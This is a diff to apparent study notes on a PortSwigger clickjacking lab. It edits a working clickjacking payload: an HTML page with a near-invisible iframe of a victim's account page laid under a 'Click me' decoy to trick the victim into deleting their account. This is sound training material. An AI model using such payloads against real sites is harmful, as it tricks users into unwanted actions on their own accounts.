@@ -5,7 +5,7 @@ Labs path:  https://portswigger.net/web-security/all-labs#clickjacking
 # 1)Lab: Basic clickjacking with CSRF token protection
 
 Lab: https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected
-Lab Vid: https://www.youtube.com/watch?v=_tz0O5-cndE&ab_channel=Intigriti
+Lab Vid: https://www.youtube.com/watch?v=_tz0O5-cndE&ab_channel=Intigriti (at 5:35 min the conclusion of the lab explained)
 
 This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.
 
@@ -49,7 +49,7 @@ iframe{
 position:relative;
         width:1000px;
         height: 700px;
-        opacity: 0.1;
+        opacity: 0.0001;
         z-index: 2;
 
 }
@@ -60,6 +60,6 @@ left:60px;
 z-index: 1;
 }
 </style>
-<div>CLICK ME</div>
-<iframe src= "https://0aed002e0411e037808830210079002f.web-security-academy.net/my-account?id=wiener"></iframe>
+<div>Click me</div>
+<iframe src= "https://0aed002e0411e037808830210079002f.web-security-academy.net/my-account"></iframe>
 ```
